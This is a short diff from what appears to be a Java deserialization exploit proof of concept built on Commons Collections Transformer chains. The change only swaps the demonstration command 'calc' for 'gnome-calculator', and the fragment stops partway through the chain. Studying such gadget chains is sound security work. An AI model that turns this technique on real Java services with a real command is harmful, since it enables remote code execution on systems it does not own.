@@ -18,7 +18,7 @@ import java.util.Map;
 
 public class highJDK8ChainTrans {
     public static void main(String args[]) throws NoSuchFieldException, IllegalAccessException {
-        String cmd = "calc";
+        String cmd = "gnome-calculator";
         Transformer[] fakeTransformers = new Transformer[] {new
                 ConstantTransformer(1)};
         Transformer[] transformerChain=new Transformer[]{
